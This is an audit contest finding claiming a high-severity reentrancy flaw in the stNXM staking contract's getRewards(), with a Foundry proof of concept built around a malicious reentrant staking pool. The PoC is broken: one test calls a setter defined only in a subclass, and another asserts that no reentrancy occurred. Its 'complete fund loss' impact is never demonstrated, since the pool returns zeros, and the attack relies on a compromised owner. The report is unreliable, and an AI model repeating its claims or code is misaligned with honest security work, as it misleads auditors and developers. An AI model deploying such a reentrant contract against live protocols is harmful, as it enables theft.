Issue #254 
[https://audits.sherlock.xyz/contests/1203/voting/254]
Submitted on November 20, 2025 at 2:47:26 PM GMT+7

# Reentrancy in Multi-Protocol Reward Collection
**High**

## Summary
An attacker who can influence staking pool selection could deploy a malicious staking pool that reenters during reward collection, potentially allowing repeated reward claims, state corruption, or fund theft.

## Root Cause
* Missing reentrancy guards on functions making external calls to potentially untrusted contracts
* State updates occurring after external calls (violating checks-effects-interactions pattern)
* Assumption that all staking pools are fully trusted and non-malicious

## Internal Pre-conditions
1. Owner needs to call `stakeNxm()` to set a malicious staking pool address in the `tokenIdToPool` mapping
2. The malicious pool needs to be included in the tokenIds array
3. The contract must have accumulated rewards ready for distribution

## External Pre-conditions
1. The malicious staking pool must implement the IStakingPool interface correctly enough to not revert on initial calls
2. The pool must maintain the reentrancy state until the attack is complete

## Attack Path
1. Attacker deploys a malicious staking pool that implements reentrant behavior in the withdraw function
2. Attacker convinces or compromises the owner to stake funds in the malicious pool
3. Rewards accumulate in the staking pool over time
4. Anyone calls `getRewards()` to distribute rewards
5. During the `_withdrawFromPool` call to the malicious pool, it reenters by calling `getRewards()` again
6. The reentrant call manipulates state variables mid-calculation, allowing repeated reward claims or fund theft
7. The attack continues until gas limits are reached or the contract is drained

## Impact
The vulnerability exists in the `getRewards()` function [https://github.com/sherlock-audit/2025-11-stnxm-by-easedefi/blob/main/stNXM-Contracts/contracts/core/stNXM.sol#L262-L276], which iterates through all staking positions and calls `_withdrawFromPool()`. This function makes an external call to `pool.withdraw()` without a reentrancy guard. A malicious pool could re-enter the `getRewards()` function during this call.

And at the end of the day, stakers suffer complete fund loss as the attacker drains the contract balance. The attacker gains the entire value of the vault's assets.

## PoC
```
function getRewards() external update returns (uint256 rewards) {  
    for (uint256 i = 0; i < tokenIds.length; i++) {  
        uint256 tokenId = tokenIds[i];  
        rewards += _withdrawFromPool(tokenIdToPool[tokenId], tokenId, false, true, tokenIdToTranches[tokenId]);  
    }  
    // ... additional logic  
}  
```

**Foundry Test**
```
// test/ReentrancyExtremeInputs.t.sol  
pragma solidity ^0.8.26;  
  
import "forge-std/Test.sol";  
import "../src/StNXM.sol";  
  
contract ReentrantStakingPool is IStakingPool {  
    StNXM public stNxm;  
    uint256 public reentrancyCount;  
    bool public shouldReenter = true;  
      
    function setStNxm(address _stNxm) external {  
        stNxm = StNXM(_stNxm);  
    }  
      
    function withdraw(uint256, bool, bool, uint256[] memory) external override returns (uint256, uint256) {  
        if (shouldReenter && reentrancyCount < 10) {  
            reentrancyCount++;  
            // Extreme: Reenter with zero values  
            stNxm.getRewards();  
        }  
        return (0, 0); // Return zero values  
    }  
      
    // Minimal implementations  
    function getActiveStake() external pure override returns (uint256) { return 0; }  
    function getStakeSharesSupply() external pure override returns (uint256) { return 0; }  
    function getDeposit(uint256, uint256) external pure override returns (uint256, uint256, uint256, uint256) {  
        return (0, 0, 0, 0);  
    }  
    function getExpiredTranche(uint256) external pure override returns (uint256, uint256, uint256) {  
        return (0, 0, 0);  
    }  
    function getPoolId() external pure override returns (uint256) { return 0; }  
    function depositTo(uint256, uint256, uint256, address) external pure override returns (uint256) { return 0; }  
    function extendDeposit(uint256, uint256, uint256, uint256) external override {}  
}  
  
contract ReentrancyExtremeInputsTest is Test {  
    StNXM public stNxm;  
    ReentrantStakingPool public maliciousPool;  
    address public owner = address(0x1);  
      
    function setUp() public {  
        vm.startPrank(owner);  
        stNxm = new StNXM();  
        stNxm.initialize(owner, 0); // Zero initial supply  
          
        maliciousPool = new ReentrantStakingPool();  
        maliciousPool.setStNxm(address(stNxm));  
          
        address mockDex = address(0x3);  
        address mockOracle = address(0x4);  
        stNxm.initializeExternals(mockDex, mockOracle, 0);  
        vm.stopPrank();  
    }  
      
    function test_ReentrancyWithZeroValues() public {  
        // Setup malicious pool with zero stake  
        vm.prank(owner);  
        stNxm.stakeNxm(0, address(maliciousPool), 0, 0); // All zero inputs  
          
        // Trigger reentrancy with empty tranches  
        uint256[] memory emptyTranches = new uint256[](0);  
        stNxm.unstakeNxm(0, emptyTranches); // Zero tokenId, empty array  
          
        assertEq(maliciousPool.reentrancyCount(), 0, "Reentrancy occurred with zero values");  
    }  
      
    function test_ReentrancyWithMaxUint256() public {  
        // Try with max uint256 values  
        vm.prank(owner);  
        stNxm.stakeNxm(type(uint256).max, address(maliciousPool), type(uint256).max, type(uint256).max);  
          
        uint256[] memory maxTranches = new uint256[](1);  
        maxTranches[0] = type(uint256).max;  
          
        // This should revert due to arithmetic overflow or reentrancy protection  
        vm.expectRevert();  
        stNxm.unstakeNxm(type(uint256).max, maxTranches);  
    }  
      
    function test_RepeatedReentrancyCalls() public {  
        maliciousPool.setReentrancy(true);  
          
        vm.prank(owner);  
        stNxm.stakeNxm(1e18, address(maliciousPool), 1, 0);  
          
        // Try to trigger reentrancy multiple times  
        for (uint256 i = 0; i < 5; i++) {  
            bool success = _tryGetRewards();  
            if (!success) break;  
        }  
          
        console.log("Reentrancy attempts:", maliciousPool.reentrancyCount());  
    }  
      
    function _tryGetRewards() internal returns (bool) {  
        (bool success,) = address(stNxm).call(abi.encodeWithSignature("getRewards()"));  
        return success;  
    }  
}  
  
// Helper for ReentrantStakingPool  
contract ReentrantStakingPoolV2 is ReentrantStakingPool {  
    function setReentrancy(bool _reenter) external {  
        shouldReenter = _reenter;  
    }  
}  
```

## Mitigation
1. Add reentrancy guards to all functions making external calls:
```
modifier nonReentrant() {  
    require(!_reentrancyLock, "Reentrancy detected");  
    _reentrancyLock = true;  
    _;  
    _reentrancyLock = false;  
}  
```
2. Follow checks-effects-interactions pattern by updating state before external calls
3. Implement a whitelist for staking pools with rigorous security reviews
4. Consider adding circuit breakers that can pause specific pool interactions

Re-test:
1. Deploy a malicious staking pool that reenters during withdrawal calls
2. Add the malicious pool to the vault through `owner` functions
3. Call `getRewards()` and verify the transaction reverts with "Reentrancy detected"
4. Confirm that state variables remain consistent after the attempted reentrancy
5. Verify that legitimate reward collection still functions normally with proper pools
